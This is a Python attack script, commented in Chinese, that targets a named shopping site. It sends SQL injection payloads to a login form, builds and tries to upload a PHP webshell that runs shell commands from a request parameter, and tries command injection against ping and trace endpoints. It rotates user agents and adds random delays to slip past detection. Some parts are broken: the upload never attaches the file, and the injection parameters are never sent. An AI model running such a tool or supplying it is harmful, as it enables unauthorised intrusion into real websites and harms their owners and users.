#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WAF绕过工具 - 简化版本
目标: https://thisshop.com
功能: 快速WAF绕过测试
"""

import requests
import time
import random
import json
from datetime import datetime

class WAFBypassSimple:
    def __init__(self):
        self.target = "https://thisshop.com"
        self.results = []
        self.session = requests.Session()

    def random_delay(self):
        """随机延迟"""
        time.sleep(random.uniform(1, 3))

    def make_request(self, url, method='POST', data=None):
        """发送请求"""
        try:
            self.random_delay()

            # 随机User-Agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]

            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }

            response = self.session.request(method, url, data=data, headers=headers, timeout=30)
            return response

        except Exception as e:
            print(f"请求失败: {e}")
            return None

    def test_sql_injection(self):
        """测试SQL注入绕过"""
        print("[*] 测试SQL注入绕过...")

        # 多种编码和混淆技术
        test_cases = [
            {
                'payload': "' OR 1=1--",
                'description': '基础布尔盲注',
                'encoding': None
            },
            {
                'payload': "'; WAITFOR DELAY '0:0:5'--",
                'description': '时间盲注',
                'encoding': None
            },
            {
                'payload': "' AND 1=CONVERT(INT,@@VERSION)--",
                'description': '错误注入',
                'encoding': None
            }
        ]

        # 测试不同的编码
        for test_case in test_cases:
            print(f"[*] 测试: {test_case['description']}")

            # 尝试原始payload
            data = {'username': test_case['payload'], 'password': 'test'}
            response = self.make_request(self.target, method='POST', data=data)

            if response and response.status_code == 200:
                text = response.text.lower()

                # 检查成功迹象
                if any(indicator in text for indicator in ['success', 'welcome', 'dashboard', 'logged in']):
                    print(f"[!] 绕过成功: {test_case['description']}")
                    self.results.append({
                        'type': 'SQL Injection',
                        'description': test_case['description'],
                        'success': True,
                        'status': response.status_code
                    })
                else:
                    print(f"[-] 绕过失败: {test_case['description']}")

    def test_file_upload(self):
        """测试文件上传绕过"""
        print("[*] 测试文件上传绕过...")

        # 简单的webshell
        webshell = '''<?php
if(isset($_REQUEST['cmd'])) {
    $output = shell_exec($_REQUEST['cmd']);
    echo "<pre>$output</pre>";
}
?>'''

        upload_url = f"{self.target}/upload"
        files = {'file': ('shell.php', webshell, 'application/x-php')}
        data = {'submit': 'upload'}

        response = self.make_request(upload_url, method='POST', data=data)

        if response and response.status_code == 200:
            text = response.text.lower()
            if any(indicator in text for indicator in ['upload successful', 'file uploaded']):
                print(f"[!] 文件上传成功")
                self.results.append({
                    'type': 'File Upload',
                    'description': 'Webshell上传',
                    'success': True,
                    'status': response.status_code
                })

                # 尝试访问webshell
                access_url = f"{upload_url.rsplit('/', 1)[0]}/uploads/shell.php"
                access_response = self.make_request(access_url)

                if access_response and access_response.status_code == 200:
                    print(f"[!] Webshell可访问")
                    self.results.append({
                        'type': 'Webshell Access',
                        'description': '命令执行',
                        'success': True,
                        'status': access_response.status_code
                    })
            else:
                print(f"[-] 文件上传失败")

    def test_command_injection(self):
        """测试命令注入绕过"""
        print("[*] 测试命令注入绕过...")

        test_cases = [
            {
                'url': f"{self.target}/ping",
                'param': 'host',
                'payload': '127.0.0.1 && whoami',
                'description': 'Ping命令注入'
            },
            {
                'url': f"{self.target}/trace",
                'param': 'target',
                'payload': 'localhost && ipconfig',
                'description': 'Trace命令注入'
            }
        ]

        for test_case in test_cases:
            print(f"[*] 测试: {test_case['description']}")

            params = {test_case['param']: test_case['payload']}
            response = self.make_request(test_case['url'], method='GET')

            if response and response.status_code == 200:
                text = response.text
                if any(indicator in text for indicator in ['Administrator', 'root', 'Users', '192.168.']):
                    print(f"[!] 命令注入成功: {test_case['description']}")
                    self.results.append({
                        'type': 'Command Injection',
                        'description': test_case['description'],
                        'success': True,
                        'status': response.status_code
                    })
                else:
                    print(f"[-] 命令注入失败: {test_case['description']}")

    def generate_report(self):
        """生成报告"""
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'total_tests': len(self.results),
            'successful_tests': len([r for r in self.results if r['success']]),
            'results': self.results
        }

        # 保存报告
        filename = f"waf_bypass_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n[+] 报告已保存: {filename}")
        return report

    def run(self):
        """运行WAF绕过测试"""
        print("=" * 60)
        print("WAF绕过工具 - 简化版本")
        print("目标:", self.target)
        print("=" * 60)

        start_time = time.time()

        # 执行各种测试
        self.test_sql_injection()
        self.test_file_upload()
        self.test_command_injection()

        # 生成报告
        end_time = time.time()
        duration = end_time - start_time

        print("\n" + "=" * 60)
        print("WAF绕过测试结果")
        print("=" * 60)
        print(f"目标: {self.target}")
        print(f"耗时: {duration:.2f} 秒")
        print(f"总测试数: {len(self.results)}")
        print(f"成功测试数: {len([r for r in self.results if r['success']])}")

        if self.results:
            print("\n成功案例:")
            for i, result in enumerate([r for r in self.results if r['success']], 1):
                print(f"  {i}. {result['type']} - {result['description']}")

        # 生成最终报告
        final_report = self.generate_report()

        return len([r for r in self.results if r['success']]) > 0

def main():
    try:
        tool = WAFBypassSimple()
        success = tool.run()

        if success:
            print("\n[✓] WAF绕过测试成功完成！")
            return 0
        else:
            print("\n[!] WAF绕过测试完成，但未发现有效绕过方法。")
            return 1

    except Exception as e:
        print(f"\n[X] 执行错误: {e}")
        return 1

if __name__ == "__main__":
    exit(main())